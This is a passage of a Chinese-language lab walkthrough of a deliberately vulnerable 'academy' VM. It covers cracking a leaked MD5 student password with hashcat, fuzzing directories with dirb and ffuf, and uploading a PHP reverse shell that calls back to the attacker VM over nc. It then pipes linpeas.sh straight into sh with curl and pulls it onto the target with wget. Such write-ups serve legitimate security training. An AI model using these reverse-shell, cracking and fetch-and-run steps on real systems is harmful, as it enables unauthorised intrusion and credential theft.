class="line"></span><br><span class="line">**-jdelta**</span><br></pre></td></tr></table></figure>

<ul>
<li><p>這邊透漏了不少敏感訊息</p>
<ul>
<li><strong>StudentRegno &gt; 10201321</strong></li>
<li><strong>password &gt; cd73502828457d15655bbd7a63fb0bc8</strong></li>
<li><strong>studentName &gt; Rum Ham</strong></li>
<li><strong>pincode &gt; 777777</strong></li>
<li><strong>cgpa &gt; 7.60</strong></li>
<li><strong>creationdate &gt; 2021-05-29 14:36:56</strong></li>
</ul>
<p>  password應該是個hash，可以看看它是什麼類型的，幫助爆破</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hash-identifier** </span><br><span class="line">   <span class="comment">#########################################################################</span></span><br><span class="line">   <span class="comment">#     __  __                     __           ______    _____           #</span></span><br><span class="line">   <span class="comment">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span></span><br><span class="line">   <span class="comment">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span></span><br><span class="line">   <span class="comment">#     \ \  _  \  /&#x27;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span></span><br><span class="line">   <span class="comment">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span></span><br><span class="line">   <span class="comment">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span></span><br><span class="line">   <span class="comment">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span></span><br><span class="line">   <span class="comment">#                                                             By Zion3R #</span></span><br><span class="line">   <span class="comment">#                                                    www.Blackploit.com #</span></span><br><span class="line">   <span class="comment">#                                                   Root@Blackploit.com #</span></span><br><span class="line">   <span class="comment">#########################################################################</span></span><br><span class="line">--------------------------------------------------</span><br><span class="line"> HASH: **cd73502828457d15655bbd7a63fb0bc8**</span><br><span class="line"></span><br><span class="line">**Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4((<span class="variable">$pass</span>)).(strtolower(<span class="variable">$username</span>)))**</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] RAdmin v2.x</span><br><span class="line">[+] NTLM</span><br><span class="line">[+] MD4</span><br><span class="line">[+] MD2</span><br><span class="line">[+] MD5(HMAC)</span><br><span class="line">[+] MD4(HMAC)</span><br><span class="line">[+] MD2(HMAC)</span><br><span class="line">[+] MD5(HMAC(Wordpress))</span><br><span class="line">[+] Haval-128</span><br><span class="line">[+] Haval-128(HMAC)</span><br><span class="line">[+] RipeMD-128</span><br><span class="line">[+] RipeMD-128(HMAC)</span><br><span class="line">[+] SNEFRU-128</span><br><span class="line">[+] SNEFRU-128(HMAC)</span><br><span class="line">[+] Tiger-128</span><br><span class="line">[+] Tiger-128(HMAC)</span><br><span class="line">[+] md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span class="variable">$username</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$username</span>.0.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$username</span>.LF.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$username</span>.md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>).md5(<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$salt</span>).<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$salt</span>).md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$username</span>.<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(md5(<span class="variable">$pass</span>)))</span><br><span class="line">[+] md5(md5(md5(md5(<span class="variable">$pass</span>))))</span><br><span class="line">[+] md5(md5(md5(md5(md5(<span class="variable">$pass</span>)))))</span><br><span class="line">[+] md5(sha1(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(sha1(md5(<span class="variable">$pass</span>)))</span><br><span class="line">[+] md5(sha1(md5(sha1(<span class="variable">$pass</span>))))</span><br><span class="line">[+] md5(strtoupper(md5(<span class="variable">$pass</span>)))</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure>
<ul>
<li>大機率是跟md5 hash相關</li>
<li>搜尋google &gt; <a target="_blank" rel="noopener" href="https://www.4armed.com/blog/hashcat-crack-md5-hashes/">https://www.4armed.com/blog/hashcat-crack-md5-hashes/</a></li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Running hashcat to Crack MD5 Hashes</span><br><span class="line"></span><br><span class="line">Now we can start using hashcat with the rockyou wordlist to crack the MD5 hashes. The rockyou wordlist comes pre-installed with Kali. If you are not using Kali you can use another wordlist, or download it from here.</span><br><span class="line"></span><br><span class="line">The <span class="built_in">command</span> to start our dictionary attack on the hashes is:</span><br><span class="line"></span><br><span class="line">hashcat –m 0 hashes /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">Argument	Function</span><br><span class="line">-m 0	Tells hashcat <span class="built_in">which</span> mode to use. 0 is MD5.</span><br><span class="line">Hashes	Our file containing the our MD5 password hashes.</span><br><span class="line">/usr/share/wordlists/rockyou.txt	Points hashcat to the wordlist containing the passwords to <span class="built_in">hash</span> and compare</span><br></pre></td></tr></table></figure>
<ul>
<li>hashcat &gt; 占用CPU，破解速度慢，可以的話用GPU跑</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **locate rockyou.txt <span class="comment">#rockyou.txt如果沒看到該檔案就去解壓縮**</span></span><br><span class="line">/usr/share/seclists/SecLists-master/Passwords/Leaked-Databases/rockyou.txt.tar.gz</span><br><span class="line">**/usr/share/wordlists/rockyou.txt**</span><br><span class="line">/usr/share/wordlists/rockyou.txt.gz</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **mousepad hash.txt <span class="comment">#cd73502828457d15655bbd7a63fb0bc8**                                                                  </span></span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt**</span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">==================================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 4184/8432 MB (2048 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Early-Skip</span><br><span class="line">* Not-Salted</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Raw-Hash</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 1 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344392</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line">* Runtime...: 2 secs</span><br><span class="line"></span><br><span class="line">**cd73502828457d15655bbd7a63fb0bc8:student**                  </span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 0 (MD5)</span><br><span class="line">Hash.Target......: cd73502828457d15655bbd7a63fb0bc8</span><br><span class="line">Time.Started.....: Thu Feb 15 12:34:06 2024 (0 secs)</span><br><span class="line">Time.Estimated...: Thu Feb 15 12:34:06 2024 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:    71479 H/s (0.47ms) @ Accel:1024 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 4096/14344385 (0.03%)</span><br><span class="line">Rejected.........: 0/4096 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344385 (0.00%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: 123456 -&gt; oooooo</span><br><span class="line">Hardware.Mon.#1..: Util: 25%</span><br><span class="line"></span><br><span class="line">Started: Thu Feb 15 12:33:24 2024</span><br><span class="line">Stopped: Thu Feb 15 12:34:08 2024</span><br></pre></td></tr></table></figure>
<ul>
<li>爆破出的密碼是<strong>student</strong>，但我們不知道要在哪裡進行登入</li>
<li>所以需要進行目錄爆破尋找登入介面</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dirb http://192.168.19.141 <span class="comment">#嘗試所有可能，尋找目錄，會把所有成功、失敗的找尋過程都列出來</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Feb 15 12:39:04 2024</span><br><span class="line">URL_BASE: http://192.168.19.141/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.19.141/ ----</span><br><span class="line">+ http://192.168.19.141/index.html (CODE:200|SIZE:10701)</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ***apt install ffuf***</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.19.141/FUZZ**</span><br><span class="line"><span class="comment"># 只列出找到的</span></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://192.168.19.141/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: **200-299,301,302,307,401,403,405,500**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># This work is licensed under the Creative Commons  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 4ms]</span></span><br><span class="line"><span class="string"># Copyright 2007 James Fisher [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 3ms]</span></span><br><span class="line"><span class="string"># directory-list-2.3-medium.txt [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 6ms]</span></span><br><span class="line"><span class="string"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 4ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 4ms]</span></span><br><span class="line"><span class="string"># on atleast 2 different hosts [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 7ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 4ms]</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 5ms]</span></span><br><span class="line"><span class="string"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 318ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 667ms]</span></span><br><span class="line"><span class="string"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1268ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1310ms]</span></span><br><span class="line"><span class="string"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1523ms]</span></span><br><span class="line"><span class="string"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1572ms]</span></span><br><span class="line"><span class="string">**academy                 [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 3ms]</span></span><br><span class="line"><span class="string">phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 4ms]**</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 147ms]</span></span><br><span class="line"><span class="string">server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 9ms]</span></span><br><span class="line"><span class="string">:: Progress: [220560/220560] :: Job [1/1] :: 4347 req/sec :: Duration: [0:00:52] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>academy、phpmyadmin</strong></p>
</li>
<li><p>找到登陸目錄了，將剛找到了登入資訊輸入</p>
<p>  <img src="/img/privilege_Untitled_5.png" alt="Untitled"></p>
</li>
<li><p>登入後會看到該用戶訊息，也可以去看看網頁源碼也許有時那邊會有敏感消息沒被刪除</p>
<p>  <img src="/img/privilege_Untitled_6.png" alt="Untitled"></p>
</li>
<li><p>接下來找尋該網頁可以利用的地方，my-profile頁面發現一個可以進行上傳檔案功能的，也許有機會進行利用</p>
</li>
</ul>
<p>  <img src="/img/privilege_Untitled_7.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_8.png" alt="Untitled"></p>
<ul>
<li><p>並且開啟圖片，可以注意到它存在某個目錄下</p>
<p>  <img src="/img/privilege_Untitled_9.png" alt="Untitled"></p>
</li>
<li><p>也許可以上傳reverse shell，網頁由php撰寫</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line">**<span class="variable">$ip</span> = <span class="string">&#x27;192.168.19.130&#x27;</span>;  // attack vm</span><br><span class="line"><span class="variable">$port</span> = 4444;       // attack vm nc**</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = 0;</span><br><span class="line"><span class="variable">$debug</span> = 0;</span><br><span class="line">....</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以對這些資訊進行修改，並將內容寫到shell.php中</p>
</li>
<li><p>先nc偵聽port，port是shell.php寫的，再將shell.php上傳到網頁中</p>
</li>
</ul>
<p>  <img src="/img/privilege_Untitled_10.png" alt="Untitled"></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nc -nlvp 4444**                             </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.141] 34072</span><br><span class="line">Linux academy 4.19.0-16-amd64 <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux</span></span><br><span class="line"> 13:44:39 up  2:29,  1 user,  load average: 0.00, 0.00, 0.08</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     tty1     -                11:16    2:23m  0.02s  0.01s -bash</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ sudo -l</span></span><br><span class="line"><span class="string">/bin/sh: 2: sudo: not found</span></span><br><span class="line"><span class="string">$ locate sudo</span></span><br><span class="line"><span class="string">/bin/sh: 3: locate: not found</span></span><br></pre></td></tr></table></figure>
<p>  可惜的是，我們並不是root最高權限的身分，需要進行提權</p>
<p>  <a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/testscript]</span><br><span class="line">└─# **curl -L** https://github.com/carlospolop/PEASS-ng/releases/latest/download/**linpeas.sh | sh**</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li>前面成功利用上傳漏洞RCE到了目標機器，但不是最高權限，現在attack vm 的linpeas.sh的目錄開一個server，我們需要將這個提權腳本上傳到目標機器上，並賦予執行權限</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/testscript/trans]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">linpeas.sh</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~kali/Desktop/testscript/trans]</span><br><span class="line">└─# **python3 -m http.server 80**                                            </span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nc -nlvp 4444**                             </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.141] 34072</span><br><span class="line">Linux academy 4.19.0-16-amd64 <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux</span></span><br><span class="line"> 13:44:39 up  2:29,  1 user,  load average: 0.00, 0.00, 0.08</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     tty1     -                11:16    2:23m  0.02s  0.01s -bash</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ cd /tmp       </span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/tmp</span></span><br><span class="line"><span class="string">$ **wget http://192.168.19.130/linpeas.sh #填入我們開伺服器(attack vm)的IP**</span></span><br><span class="line"><span class="string">--2024-02-15 14:07:43--  http://192.168.19.130/linpeas.sh</span></span><br><span class="line"><span class="string">Connecting to 192.168.19.130:80... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 853290 (833K) [text/x-sh]</span></span><br><span class="line"><span class="string">Saving to: &#x27;</span>linpeas.sh<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">     0K .......... .......... .......... .......... ..........  6% 7.45M 0s</span></span><br><span class="line"><span class="string">    50K .......... .......... .......... .......... .......... 12% 8.95M 0s</span></span><br><span class="line"><span class="string">   100K .......... .......... .......... .......... .......... 18% 30.6M 0s</span></span><br><span class="line"><span class="string">   150K .......... .......... .......... .......... .......... 24% 23.9M 0s</span></span><br><span class="line"><span class="string">   200K .......... .......... .......... .......... .......... 30% 25.1M 0s</span></span><br><span class="line"><span class="string">   250K .......... .......... .......... .......... .......... 36% 20.1M 0s</span></span><br><span class="line"><span class="string">   300K .......... .......... .......... .......... .......... 42% 44.6M 0s</span></span><br><span class="line"><span class="string">   350K .......... .......... .......... .......... .......... 48% 92.5M 0s</span></span><br><span class="line"><span class="string">   400K .......... .......... .......... .......... .......... 54% 64.9M 0s</span></span><br><span class="line"><span class="string">   450K .......... .......... .......... .......... .......... 60% 11.7M 0s</span></span><br><span class="line"><span class="string">   500K .......... .......... .......... .......... .......... 66% 6.96M 0s</span></span><br><span class="line"><span class="string">   550K .......... .......... .......... .......... .......... 72% 20.9M 0s</span></span><br><span class="line"><span class="string">   600K .......... .......... .......... .......... .......... 78% 32.4M 0s</span></span><br><span class="line"><span class="string">   650K .......... .......... .......... .......... .......... 84%  190M 0s</span></span><br><span class="line"><span class="string">   700K .......... .......... .......... .......... .......... 90%  198M 0s</span></span><br><span class="line"><span class="string">   750K .......... .......... .......... .......... .......... 96%  262M 0s</span></span><br><span class="line"><span class="string">   800K .......... .......... .......... ...                  100% 18.4M=0.04s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2024-02-15 14:07:43 (20.4 MB/s) - &#x27;</span>linpeas.sh<span class="string">&#x27; saved [853290/853290]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">linpeas.sh</span></span><br><span class="line"><span class="string">$ chmod +x linpeas.sh</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>  先來看看linpeas.sh執行了什麼</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./linpeas.sh</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">LEGEND:                                                                                                                      </span><br><span class="line">  RED/YELLOW: 95% a PE vector  <span class="comment">#可以專注在查看RED</span></span><br><span class="line">  RED: You should take a look to it</span><br><span class="line">  LightCyan: Users with console</span><br><span class="line">  Blue: Users without console &amp; mounted devs</span><br><span class="line">  Green: Common things (<span class="built_in">users</span>, <span class="built_in">groups</span>, SUID/SGID, mounts, .sh scripts, cronjobs) </span><br><span class="line">  LightMagenta: Your username</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">╔════════════════════╗</span><br><span class="line">══════════════════════════════╣ System Information ╠══════════════════════════════                                            </span><br><span class="line">                              ╚════════════════════╝                                                                          </span><br><span class="line">╔══════════╣ Operative system</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                            </span><br><span class="line">Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19)</span></span><br><span class="line">Distributor ID: Debian</span><br><span class="line">Description:    Debian GNU/Linux 10 (buster)</span><br><span class="line">Release:        10</span><br><span class="line">Codename:       buster</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">╔══════════╣ Cron <span class="built_in">jobs</span></span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                        </span><br><span class="line">/usr/bin/crontab                                                                                                              </span><br><span class="line">incrontab Not Found</span><br><span class="line">-rw-r--r-- 1 root root    1077 Jun 16  2021 /etc/crontab                                                                      </span><br><span class="line"></span><br><span class="line">/etc/cron.d:</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line">-rw-r--r--  1 root root  712 Dec 17  2018 php</span><br><span class="line"></span><br><span class="line">/etc/cron.daily:</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line">-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2</span><br><span class="line">-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat</span><br><span class="line">-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils</span><br><span class="line">-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg</span><br><span class="line">-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate</span><br><span class="line">-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db</span><br><span class="line">-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd</span><br><span class="line"></span><br><span class="line">/etc/cron.hourly:</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line"></span><br><span class="line">/etc/cron.monthly:</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line"></span><br><span class="line">/etc/cron.weekly:</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line">-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db</span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">...</span><br><span class="line">* * * * * /home/grimmie/backup.sh</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">╔══════════╣ Searching passwords <span class="keyword">in</span> config PHP files</span><br><span class="line">/usr/share/phpmyadmin/config.inc.php:<span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;AllowNoPassword&#x27;</span>] = <span class="literal">false</span>;                                          </span><br><span 